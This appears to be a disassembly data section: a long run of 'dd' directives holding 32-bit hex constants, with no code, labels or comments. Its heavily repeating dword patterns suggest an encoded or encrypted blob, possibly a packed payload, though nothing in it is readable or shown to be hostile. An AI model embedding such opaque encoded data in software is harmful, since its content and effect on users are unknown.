		dd 90DEB9ACh, 0B43E69F8h, 491E8FCFh, 35869E4Bh,	0CAB7B09Bh
		dd 9EF6DEB9h, 0A3D23E69h, 742F43D2h, 0D0530C14h, 35AC2720h
		dd 0FF86F47h, 70CFD23Eh, 614B1C78h, 4FF1AC79h, 216C5348h
		dd 0C1920709h, 0E177302Dh
		dd 79570258h, 4809DE20h, 9A785C1h, 2D482888h, 0D0C1167Dh
		dd 0AC7E61B4h, 53494F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4652484Fh, 71F8C5B8h, 0B0CFD236h,	0F84B2F1Ah
		dd 0D69B5386h, 0B8B9ACB7h, 5869F8F6h, 788FCFD2h, 0E09E4B2Fh
		dd 0D1B09B53h, 90DEB9ACh, 0B43E69F8h, 491E8FCFh, 35869E4Bh
		dd 0F0B7B09Bh, 9EF6DEB8h, 0A9D23E69h, 2D2F1E8Fh, 0FD53869Eh
		dd 0DFACB7B0h, 0FF8F6DEh, 0E9CFD23Eh, 0F84B2F1Eh, 0D69B5386h
		dd 0B8B9ACB7h, 5869F8F6h, 798FCFD2h, 0BE9E1175h, 0F5B01ED6h
		dd 73DE3326h, 0B43EFC6Dh, 0D01E8FCFh, 0AC86AD2Dh, 53DD4F64h
		dd 7232146h, 3027C196h,	0B4F1E170h, 648D7961h, 4658484Fh
		dd 96060921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 0B9635E91h, 371E9CE5h, 32869E4Dh, 0CAB7B09Bh, 9EF6DEB9h
		dd 0A9D23E69h, 2D2F1E8Fh, 0FD53869Eh, 0DFACB7B0h, 0FF8F6DEh
		dd 0E9CFD23Eh, 0F84B2F1Eh, 0E69B5386h, 0C6B9ACB6h, 2D69F8F0h
		dd 3D8FCFD4h, 0AE9E4B2Ah, 8BB09B57h, 0B1DEB9AFh, 833E69FAh
		dd 4E1E8FCEh, 35869E4Bh, 0CAB7B09Bh, 9EF6DEB9h,	0A9D23E69h
		dd 2A2F1E8Fh, 0B453D0C8h, 80AC3730h, 10F8735Bh,	0E9CF42AEh
		dd 614B2F1Eh, 4F9B60E0h, 21D35348h, 97BC0709h, 0F43C1B06h
		dd 792EBEDAh, 482E64ACh, 9104653h, 2DC99607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 6E11EB55h, 834B0244h
		dd 8A9B508Dh, 0B8B9ACB5h, 5869F8F6h, 788FCFD2h,	0E09E4B2Fh
		dd 0D1B09B53h, 90DEB9ACh, 0B43E69F8h, 491E8FCFh, 33869E4Bh
		dd 0B2B7B09Bh, 0C3F6DEBDh, 0CD2347Eh, 0FF2F38C1h, 1D53A5D6h
		dd 0CEACAE85h, 23F8E0F1h, 0A3CFDF23h, 904B290Fh, 0BE9B5383h
		dd 0FAB9ACB2h, 1169F8F2h, 248FCFD1h, 0C19E4B2Dh, 9DB0C900h
		dd 0C2DEC5D0h, 0BF3EE879h, 491E0545h, 0AC869E4Bh, 53B783FDh
		dd 7852146h, 690AC196h,	0EABECC5Dh, 6E4D564Eh, 46CF4D4Ah
		dd 966A0921h, 70122DC1h, 61B0D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0D7DAA621h, 0BCB7A9AFh, 98F6DEBAh
		dd 0A9D23E69h, 2D2F1E8Fh, 0FD53869Eh, 0DFACB7B0h, 0FF8F6DEh
		dd 0E9CFD23Eh, 0F84B2F1Eh, 9C9B5386h, 0C7B9ACB5h, 0E169FBFFh
		dd 0E189FBB2h, 79098AFFh, 480DF0C3h, 966FED9h, 2DB65697h
		dd 0D068CEBFh, 0ACBCA720h, 4C9D89F1h, 3AF6F3E3h, 5BD21824h
		dd 0CF2F03B4h, 0CB539FAAh, 9BACEFD2h, 47F881A9h, 0DECFAF43h
		dd 0BF4BAB9Ah, 409B5384h, 21B99CD7h, 0C1C80709h, 0B46C302Dh
		dd 1FE79FFBh, 5B0579Fh,	9C66174h, 2D5A9607h, 0D0AB7030h
		dd 0AC7761B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 5F456AEDh, 0CBB99CD7h, 3B69FBFEh, 1B8FCFD0h,	9B9E4B2Dh
		dd 0AAB09B52h, 0C3DEB9ADh, 0EE3E69F9h, 611E8FCEh, 6F869E4Bh
		dd 0A9B7B09Ah, 49F6DEBBh, 30D21D2Eh, 0B44F873Dh, 64887961h
		dd 4657484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F65AC79h
		dd 21475348h, 0C1970709h, 0E151F6B9h, 79257440h, 0CA28DA23h
		dd 0EFE9C421h, 0F73E1889h, 0AE1EF8B8h, 0AC8613D2h, 53B783FDh
		dd 7BE93C3h, 3037C196h,	0EBCBE170h, 273564Eh, 20AC7B7Ch
		dd 0BEF83A12h, 70F939D5h, 61C6D0E1h, 4F78AC79h,	21475348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 27A8EBD1h
		dd 70D21330h, 0D42F38C3h, 0E453A6DEh, 0C9ACAE83h, 29F8E0F3h
		dd 0BFCFDF27h, 9E4B250Dh, 0B09B5386h, 0AEB9ACB7h, 0C169EEDBh
		dd 0E1AD80A9h, 7956B4D0h, 484564ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 0F152484Fh, 708D527Ah, 92CFA24Eh
		dd 0F74B5D6Ch, 4F88E732h, 213C5348h, 0C1B40709h, 0AD63302Dh
		dd 17E192F6h, 2EB0539Bh, 6FDE7560h, 613EA534h, 0D00B5616h
		dd 0ACF761B4h, 536F4F64h, 7082146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E171302Dh, 79237244h
		dd 4808DC26h, 95686C3h,	2D482888h, 0D046B2A2h, 0ACBFA420h
		dd 539D89F1h, 7F6EDDFh,	30C90603h, 0B4EB8F23h, 64A77961h
		dd 4652484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 0A1204653h, 0F04BC352h, 361EFBBBh, 0F86F124h, 53A41D36h
		dd 7772146h, 781BC196h,	3DB9C554h, 1A543D25h, 28AC7770h
		dd 0F0F83E16h, 16CF1EF2h, 614BE3D2h, 4FF6AC79h,	216E5348h
		dd 0C1970709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B5D0E1h, 4F65AC79h, 21475348h, 0C1970709h
		dd 0E171302Dh, 7960B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 1060921h, 0A5BA618Dh
		dd 834B5869h, 0EA9B23F6h, 21AB011Ah, 0FE050709h, 40FC2F32h
		dd 0E599E581h, 0C6B02AE2h, 77DE0015h, 433EA938h, 0B61E4707h
		dd 0AC865287h, 53CA4F64h, 72B2146h, 302CC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 0A5C09607h, 1D6B3373h, 7686E431h, 0CBB7C3E8h
		dd 59E76D0Ah, 8FFDEEB9h, 0C2A8110h, 0C353253Dh,	0DAAC1C1Bh
		dd 18F8476Fh, 0ECF6B87h, 44BEFDEh, 4F909E4Bh, 21185348h
		dd 0C1820709h, 0E171302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	0D312DC1h
		dd 0A63EEEDFh, 9E9B2FFAh, 91B9DAC1h, 1695F51h, 2D8F504Dh
		dd 0B19ED2B6h, 0F0B000C8h, 0AEDE1A0Fh, 0B13EC253h, 5E1E3E7Eh
		dd 0FF8627F2h, 538C654Eh, 7382146h, 302BC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0A0E07030h, 12F3598Ch, 9BB7CFE4h, 98F6A4C3h,	80D291C6h
		dd 742FB928h, 0A8531901h, 8EAC2E29h, 2EF86D45h,	0D7CF719Dh
		dd 0F74B84B5h, 559CE732h, 211F5E45h, 0C1840709h, 0E171302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 3EB5D0E1h, 0F9EE8356h
		dd 0E2B92E35h, 5169848Ah, 7E8F7865h, 0C99EE480h, 88B03CF4h
		dd 0C5DE2633h, 0E53EF061h, 681E1454h, 0CD863DE8h, 53C27E55h
		dd 7132146h, 302EC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0CE7861B4h, 0E0C27E55h, 0BCF65D3Ah, 0B2D24116h
		dd 242FA031h, 0FB533129h, 0F6AC181Fh, 56F85179h, 0BCCF4DA1h
		dd 0E14BB687h, 4FF2EC39h, 215A5348h, 0C1920709h, 0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 3865AC79h
		dd 9ACC6873h, 72698688h, 928F4D50h, 0FB9E8DE9h,	0D8B025EDh
		dd 96DE0E1Bh, 9D3EC657h, 0AA1E2868h, 0ACEF5C89h, 53544F64h
		dd 70D2146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 0D8494F64h, 0C3836700h, 84D24611h
		dd 0D22F9E0Fh, 17534A52h, 0C4AC7176h, 6F84860h,	19CF6589h
		dd 6127E4D5h, 4F78AC79h, 21425348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 0B6475348h, 0D1F4B45h, 218FBCA1h, 99E3256h, 2EB05C94h
		dd 67DE7560h, 7736A130h, 0D06B5C1Ch, 0AC6F61B4h, 534C4F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 0A9092146h, 0F2A896C1h
		dd 52F9504h, 0E153120Ah, 2CAC0A0Dh, 0AFED3C14h,	706631DDh
		dd 61BAD0E1h, 4F66AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 8960709h,	4F315449h, 0EEE4E387h, 0C3C628E0h
		dd 49AB0015h, 2DE1B627h, 0D0E67030h, 0AC7861B4h, 53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 31960709h, 1E8FCF2Ah, 9961B42Fh, 0B7B01BACh,	0E92146ACh
		dd 0D23E9107h, 30E170CFh, 534661B4h, 0B3484F9Bh, 0F80A2146h
		dd 0D02DC169h, 8BD0E170h, 84AC799Eh, 4153484Fh,	760709DEh
		dd 73302DC1h, 81B4D01Eh, 4E64AC79h, 0C14653B7h,	0C0960709h
		dd 17030D2h, 7961B4D0h,	0A84F6453h, 9214653h, 0CDC196F8h
		dd 0D0E17030h, 4C79614Bh, 53484F64h, 0E7092139h, 302DC196h
		dd 54D0E10Fh, 64AC7961h, 0A6534870h, 96070921h,	90302DFEh
		dd 61B4D0E1h, 8F64AC66h, 21465348h, 1960716h, 0E170302Dh
		dd 0B961B4DFh, 484F64ACh, 0C921465Ch, 2DC19607h, 10E1703Fh
		dd 0AC7961B4h, 93484F63h, 7092146h, 0F02DC191h,	0B4D0E170h
		dd 0A4AC7962h, 4653484Fh, 56070922h, 70302DC1h,	0A1B4D0E0h
		dd 4F64AC79h, 0E1465349h, 0C1960709h, 2170302Eh, 7961B4D0h
		dd 884F64AFh, 9214653h,	0CDC19638h, 0D0E17030h,	4C79618Bh
		dd 53484F64h, 0F7092159h, 302DC196h, 44D0E16Fh,	64AC7761h
		dd 0BE534840h, 96F71621h, 8C302DCEh, 6144CFE1h,	0B064AC76h
		dd 21B62CA8h, 3E960706h, 0E180CFD2h, 8661B4DFh,	48BF9B53h
		dd 0F621464Ch, 2D3169F8h, 2FE1702Fh, 0AC899E4Bh, 0AC484F5Bh
		dd 7F9DEB9h, 0CF2DC1E9h, 0B4201E8Fh, 9BAC799Eh,	47A3B7B0h
		dd 690709DEh, 73C0D23Eh, 9EB4D01Eh, 489C5386h, 0DE4653B7h
		dd 0CE6EF8F6h, 197030D2h, 5161B058h, 684F64ACh,	49214653h
		dd 2CC19607h, 0D0E15030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 703A2DC1h, 619FD0E1h, 4F24AC79h, 21755348h, 0C1B20709h
		dd 0E16A302Dh, 7971B4D0h, 484864ACh, 9204653h, 2DC09607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53494F64h, 747863Bh, 30A4B6CFh, 0B446F760h
		dd 64397961h, 46D1484Fh, 966B0921h, 70622DC1h, 618ED0E1h
		dd 4F4CAC79h, 215B5348h
		dd 0C1850709h, 0E17A302Dh, 7962B4D0h, 484E64ACh, 9204653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7960B4D0h, 68C5DA22h, 24DE94F5h,	2D3E4FAAh
		dd 0D012DEB2h, 0AC9DEFDFh, 53851023h, 7B9045Ah,	30B7C196h
		dd 0B45BE170h, 64DF7961h, 4609484Fh, 96440921h,	701E2DC1h
		dd 61ABD0E1h, 4F72AC79h, 214B5348h, 0C1930709h,	0E171302Dh
		dd 7960B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70312DC1h, 463E6E6Fh
		dd 0AB9B7AD0h, 4FB9ACBFh, 9869F8DDh, 0DF8FC5E4h, 5A9E5D6Ah
		dd 46B0B800h, 9DA8FCAh,	2D280C74h, 0D0351C61h, 0ACC72480h
		dd 53D74F64h, 7982146h,	3057C196h, 0B4B1E170h, 64E67961h
		dd 4667484Fh, 96230921h, 702A2DC1h, 61A4D0E1h, 4F63AC79h
		dd 21475348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7082146h, 1BA67D1Bh,	7B2F3EDEh, 1F538C8Dh, 34ACB795h
		dd 0E4F8F6F9h, 2CFD219h, 134B2F39h, 2B9B53A1h, 69B9AA98h
		dd 0F269EBC8h, 0F78FD298h, 799E6275h, 48A1C0D7h, 9FB3E09h
		dd 2D04C539h, 0D049633Eh, 0ACEC61B4h, 53CA4F64h, 7652146h
		dd 307FC196h, 0B4EAE170h, 64897961h, 4643484Fh,	96040921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484E64ACh, 5DACFFD8h,	5D3E79C6h
		dd 7A1E92F6h, 0D4869E5Eh, 2BB7B0BAh, 7FF6DE98h,	48D23E48h
		dd 0CC2F1EAEh, 1C5386BFh, 3EACB791h, 0EEF8F6FFh, 0CFD21Fh
		dd 3B4B2C3Bh, 739B5EB4h, 3EB9B5F4h, 0C169DEA2h,	0E1839EAFh
		dd 79853ABBh, 48823BEBh, 991634Fh, 2D5B9607h, 0D0607030h
		dd 0AC3F61B4h, 53584F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B5D0E1h
		dd 0CECE13F6h, 1B9AC9Dh, 1769D5AFh, 9D8FCFDBh, 59E4B32h
		dd 34B09B4Eh, 75DEB9B1h, 513E69E5h, 0AC1E8FD2h,	0D0869E56h
		dd 2FB7B086h, 7BF6DEA4h, 4CD23E74h, 0C82F1E92h,	18538683h
		dd 3AACB7ADh, 0F3F8F6C3h, 37CFD814h, 464B3922h,	5F9B70C9h
		dd 21BD9AD3h, 0C15D5735h, 0E10F302Dh, 7949B4D0h, 484B64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302CC196h,	0CC1725E3h, 745383B0h, 89AC9CEEh
		dd 1CF8FCCDh, 0F2CFD228h, 0E34B2F09h, 0CD9B5391h, 0A3B9ACA0h
		dd 4369F8E1h, 638FCFC5h, 0FB9E4B38h, 0CAB09B44h, 8BDEB9BBh
		dd 0AF3E69EFh, 521E8FD8h, 2E869E5Ch, 0D1B7B08Ch, 85F6DEAEh
		dd 0B2D23E7Eh, 0DB2F1E98h, 645385B9h, 46A4F0C5h, 96A70921h
		dd 707D2DC1h, 61BBD0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 2A204653h,	560646A5h
		dd 0F61E8AE1h, 2C86BE18h, 0E7B7A9A8h, 80F6DEB5h, 0B7D23E7Bh
		dd 332F1E9Dh, 0E353868Ch, 0C3ACB7A2h, 0EFF8F6CAh, 1FCFD21Eh
		dd 0E4B2F34h, 209B53ACh, 4EB9AC9Dh, 0B469F8DCh,	608FCFF6h
		dd 0FE9E4B37h, 0CFB09B41h, 8EDEB9BEh, 433E69EAh, 0EC1E8FE4h
		dd 0AC86BE0Bh, 53821E59h, 7712146h, 300FC196h, 0B4D2E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 7F65AC79h, 0A28E80E0h, 8069FCDDh, 0D18FDC94h, 0AA9E627Ch
		dd 0C3B09B56h, 82DEB9A2h, 0A63E69F6h, 0AF1E8FC1h, 0C2869E51h
		dd 0F1B7B0B0h, 0D7F6C082h, 0DCD20421h, 4B2F21CAh, 0BE53CDD5h
		dd 81AC8DF5h, 6F8CB91h,	9CFCB02h, 0EA4B2F3Eh, 0C49B5388h
		dd 4EB9ACB9h, 5569F8DCh, 0E18FC9DFh, 798F10ABh,	48D564ACh
		dd 9634653h, 2DCB9607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	86D1E170h, 0EE65ABC6h, 8ACB498h
		dd 8FF8FAE1h, 0A8CFF564h, 0F04B2913h, 0DE9B538Eh, 0A6B9ACBFh
		dd 4D69F8E4h, 58FC2FFh,	859E736Fh, 0B1B0AD66h, 0F5DE9D8Fh
		dd 0D23E4DDCh, 2F1EAEEEh, 53868550h, 0ACB7AA81h, 0C7F6E582h
		dd 4ED20722h, 252F1E94h, 15538696h, 0F4ACB798h,	0BBF8F6DEh
		dd 70CFF472h, 6109E4C6h, 4F09AC79h, 215A5348h, 0C1970709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 4C09607h
		dd 581EA99Bh, 0FB869D63h, 64B7B7A1h, 88F6C6F2h,	86D22844h
		dd 222F1E8Dh, 0E053869Dh, 0AFACB3AFh, 7CF8C3E6h, 97CFFE16h
		dd 894B063Bh, 0A89B7BA2h, 0CBB98592h, 3669D2D1h, 1E8FE8F4h
		dd 869E6B0Fh, 0B7B08D45h, 0CDDE9386h, 0BD3E50B0h, 0A21E8FC6h
		dd 10869E6Ch, 0DEB7B09Bh, 7F6D3A0h, 30C84FFCh, 0B444E170h
		dd 64977961h, 465A484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 17475348h, 4669DBB9h, 838FCEFAh, 2F9E491Ah
		dd 78B09368h, 0D0DE90FFh, 0B13E69F8h, 671E8FCFh, 42868463h
		dd 0B9B79CB1h, 0ECF6FD99h, 0DCD21F76h, 5F2F3E92h, 8E53A781h
		dd 0AEAC9391h, 79F8DEFAh, 8FCFF819h, 9E4B0F3Eh,	0B09B4693h
		dd 0BCB9EFF4h, 0B269F5E1h, 298FCFF4h, 0B19E4B2Fh, 6EB09B53h
		dd 9DE90FFh, 2D77B21Ch,	0D0847030h, 0AC6061B4h,	53494F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 3EAD7961h, 0CBACAEF0h
		dd 0FEF8F6FBh, 18CFD20Fh, 754B2F2Fh, 969B7ADAh,	0ECB9AABAh
		dd 2969F8F6h, 0D8FECF5h, 969E6A31h, 0B9B0874Ah,	0FBDEA0BAh
		dd 0DC3E7EEDh, 3F1E96D9h, 47868252h, 0BBB792BBh, 0F0F6F69Dh
		dd 0CFD2194Fh, 4B2F0594h, 9653A3BBh, 31AC8A8Dh,	59F8F6F8h
		dd 0BFCFD23Eh, 0E34B2F1Eh, 4F9B40A0h, 21A6D12Ah, 0C11B0709h
		dd 0E142302Dh, 7967B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 8DE57030h, 39868775h, 3CB7B0BBh, 68F6DE93h, 63D23E43h
		dd 932F13B6h, 0E453AFCBh, 0E9ACAE83h, 59F8E6FEh, 8CCFD82Dh
		dd 9D4B2A1Ah, 0B59B5583h, 0D6B9A5BFh, 3369F5FAh, 0F8FD8C6h
		dd 909E5735h, 0A3B0BF71h, 0F6DE938Bh, 0D23E49D8h, 221EA7E7h
		dd 0D686A376h, 88B7B0BDh, 0DCF6DEB9h, 0EBD23E69h, 0A82F1E8Fh
		dd 6457B0FEh, 46FF5B41h, 965D0921h, 70232DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0A38F856Bh, 7F8FD6EFh,	9E4B35h
		dd 31B09B73h, 70DEB98Ch, 5C3E69D8h, 8B1E8CEAh, 0FE86937Ah
		dd 6B7F0FAh, 47F68ED6h,	0D20409h, 0D42F37DCh, 0CB53A6DEh
		dd 0BDACA790h, 66F8F1D9h, 9BCFC829h, 864B0D01h,	0B09B7AA0h
		dd 0DEB98F94h, 3369D1DFh, 9F8FF2EFh, 9B9E4B09h,	0AAB09B53h
		dd 0EBDEB9ACh, 5C3E69F8h, 0D01E96FCh, 0ACAF0BE4h, 53CC4F64h
		dd 7222146h, 3029C196h,	0B4D0E170h, 64AC7961h, 231BFEC7h
		dd 5F8EFE2h, 0F1CFD229h, 0E04B2F06h, 0CE9B539Eh, 0A0B9ACAFh
		dd 4069F8EEh, 6E8FCFCAh, 0A49E561Fh, 0B7B01CD4h, 0F6DE8491h
		dd 0E23E7AEBh, 801E91E8h, 3386B119h, 0A9B7A3BDh, 0F7F6D7B1h
		dd 0D7D2277Eh, 4B2F37A9h, 9B53A0B8h, 0B4AC9691h, 14F8CBE3h
		dd 9ECFD218h, 8F4B2F1Eh, 0A19B5386h, 0FEB9ACB7h, 0CE69FBF0h
		dd 0E1878CBDh, 79C0B4D0h, 481E64ACh, 9314653h, 2DC19607h
		dd 0D0E17030h, 3C31D73Ch, 0CFB7A0B1h, 8DF6DEB6h, 0BAD23E66h
		dd 3E2F1E80h, 0EE538691h, 0CCACB7BFh, 1CF8F6D1h, 0D3CFD231h
		dd 0BE4B165Ch, 0B39B27F2h
		dd 0DEB9B8A3h, 2E69EFE1h, 0D18FF193h, 99E714Bh,	0C7B0866Ah
		dd 0B6DEAF81h, 0F23E64E1h, 2F1E85DFh, 5B869B4Eh, 91B7B79Ch
		dd 0F0F6DEAAh, 0C7D23E69h, 422F1E8Fh, 9253869Eh, 2AACB7B0h
		dd 96F8EBE7h, 70F84F88h, 61DDD0E1h, 4F7DAC79h, 21475348h
		dd 0C1960709h, 433983ABh, 0DA9E460Ch, 0DAB09B5Ah, 9BDEB9ABh
		dd 0BF3E69FFh, 421E8FC8h, 3E869E4Ch, 0C1B7B09Ch, 95F6DEBEh
		dd 0ADD23E6Eh, 752F03ADh, 0B953E8F1h, 0A6ACC9CEh, 4AF88CA4h
